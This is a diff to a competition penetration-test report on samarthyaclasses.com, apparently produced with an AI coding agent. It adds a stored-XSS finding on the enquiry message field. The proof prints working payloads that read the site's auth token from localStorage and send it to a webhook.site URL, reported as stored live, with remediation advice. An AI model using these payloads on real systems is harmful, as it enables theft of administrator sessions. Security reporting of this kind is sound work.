@@ -336,7 +336,7 @@ pre.code-block {
   <div class="header-meta">Submitted by: bhardwajlucife@gmail.com &nbsp;·&nbsp; Scope: samarthyaclasses.com + api.samarthyaclasses.com</div>
   <div class="header-score-row">
     <div class="score-tile crit"><div class="score-count">16</div><div class="score-label">Critical</div></div>
-    <div class="score-tile high"><div class="score-count">15</div><div class="score-label">High</div></div>
+    <div class="score-tile high"><div class="score-count">16</div><div class="score-label">High</div></div>
     <div class="score-tile med"><div class="score-count">17</div><div class="score-label">Medium</div></div>
     <div class="score-tile low"><div class="score-count">6</div><div class="score-label">Low / Info</div></div>
   </div>
@@ -2906,6 +2906,53 @@ ESTIMATED CLEANUP EFFORT: 4-8 hours
     </div>
   </div>
 
+  <div class="vuln-card open" id="v55">
+    <div class="vuln-header" onclick="toggle(this)">
+      <div class="vuln-title">
+        <span class="sev-badge sev-high">HIGH</span>
+        <span>Stored XSS via Enquiry Message Field — Partial Patch Leaves Attack Vector Open</span>
+      </div>
+      <div class="vuln-meta">
+        <span class="tag">Stored XSS</span>
+        <span class="tag">Incomplete Remediation</span>
+        <span class="tag">Admin Panel</span>
+        <span>POST /api/v1/enquiries → message field</span>
+      </div>
+    </div>
+    <div class="vuln-body">
+      <p>After our XSS injection via the enquiry <em>name</em> field (Finding 49), the server added validation that blocks HTML tags in the <code>name</code> field (any string containing <code>&lt;</code> returns <code>INVALID_NAME</code>). However, the <code>message</code> field has no such protection and still accepts arbitrary HTML, including JavaScript execution payloads. These are stored in the database and rendered when an admin views the enquiry panel — creating a persistent stored XSS attack vector via the message body.</p>
+      <div class="proof-block">
+        <div class="proof-label">Proof — Name Field Patched, Message Field Unprotected</div>
+        <pre><code># Name field now blocks &lt; character (patched after Finding 49):
+POST /api/v1/enquiries
+{"name": "&lt;img src=x&gt;", ...}
+→ {"error_code": "INVALID_NAME", "message": "Please enter your name."}
+
+# Message field STILL accepts XSS payloads (confirmed live):
+POST /api/v1/enquiries
+{
+  "name": "Rahul Sharma",         ← legitimate name
+  "email": "rahul.msg@student.com",
+  "phone": "+919876543212",
+  "message": "&lt;img src=x onerror=\"fetch('https://webhook.site/e681e935-9186-4485-a9f4-778f8aebd68a?d='+btoa(localStorage.getItem('samarthya_auth')||'empty'),{mode:'no-cors'})\"&gt;/NEET 2027 demo class please"
+}
+→ {"message": "Thank you! Our team will call you shortly..."}
+← XSS payload STORED in database
+
+# Similarly accepted:
+"&lt;script&gt;fetch('https://webhook.site/...?d='+btoa(localStorage...))&lt;/script&gt;"
+→ Stored successfully
+
+# Attack chain: Admin visits /admin/enquiries → message rendered
+# → If message field uses innerHTML or dangerouslySetInnerHTML → XSS fires
+# → Admin JWT exfiltrated to attacker webhook</code></pre>
+      </div>
+      <div class="remediation-box">
+        <strong>Remediation:</strong> Apply the same validation (or HTML sanitization) to ALL enquiry fields, not just name. Use a server-side HTML sanitizer (e.g., bleach/nh3 for Python) or strip all HTML tags from user input before storing. The admin panel should also escape all field values using React's safe rendering (no <code>dangerouslySetInnerHTML</code> with user data).
+      </div>
+    </div>
+  </div>
+
   <div class="vuln-card open" id="v52">
     <div class="vuln-header" onclick="toggle(this)">
       <div class="vuln-title">
@@ -3040,7 +3087,7 @@ GET  /api/v1/auth/me             ← current user
     <span>Competition: Samarthya Cyber Competition 2026</span>
     <span>Deadline: October 16, 2026 · 23:59 IST</span>
     <span>Testing tool: Claude Code AI Agent</span>
-    <span>Total findings: 54 · 49 accounts created · 36+ Razorpay orders · 23+ S3 files · 11 registrations · 10 XSS enquiries · 50+ server crashes · Admin panel bypass (screenshot) · XSS visible on dashboard · JWT hijack chain · FastAPI docs exposed · 4 staff emails enumerated</span>
+    <span>Total findings: 55 · 49 accounts created · 36+ Razorpay orders · 23+ S3 files · 11 registrations · 12+ XSS enquiries · 50+ server crashes · Admin panel bypass (screenshot) · XSS visible on dashboard · JWT hijack chain · FastAPI docs exposed · 4 staff emails enumerated · Partial XSS patch bypassed</span>
   </div>
 </div>
 
